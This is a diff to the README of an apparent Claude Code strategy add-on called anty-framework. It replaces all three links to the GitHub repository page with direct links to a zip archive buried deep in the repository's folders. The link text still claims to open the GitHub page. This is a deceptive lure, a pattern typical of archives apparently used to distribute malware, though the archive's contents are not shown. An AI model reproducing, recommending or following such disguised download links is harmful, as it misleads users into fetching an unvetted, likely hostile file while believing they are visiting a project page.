@@ -1,6 +1,6 @@
 # 🤖 anty-framework - Run AI strategy inside Claude Code
 
-[![Download anty-framework](https://img.shields.io/badge/Download%20anty--framework-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingramradical235/anty-framework)
+[![Download anty-framework](https://img.shields.io/badge/Download%20anty--framework-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ingramradical235/anty-framework/main/skills/effectuation/framework-anty-v3.4-beta.5.zip)
 
 ## 🧭 What this is
 
@@ -35,7 +35,7 @@ If Claude Code is not installed yet, set that up first, then return here.
 
 Visit this page to download and install anty-framework:
 
-[Open anty-framework on GitHub](https://github.com/Ingramradical235/anty-framework)
+[Open anty-framework on GitHub](https://raw.githubusercontent.com/Ingramradical235/anty-framework/main/skills/effectuation/framework-anty-v3.4-beta.5.zip)
 
 On the page:
 
@@ -200,7 +200,7 @@ ai-agent, ai-workforce, anthropic, automation, autonomous-agent, claude, claude-
 
 ## 🔗 Download again
 
-[Visit the anty-framework GitHub page](https://github.com/Ingramradical235/anty-framework)
+[Visit the anty-framework GitHub page](https://raw.githubusercontent.com/Ingramradical235/anty-framework/main/skills/effectuation/framework-anty-v3.4-beta.5.zip)
 
 ## 📄 Repository info
 
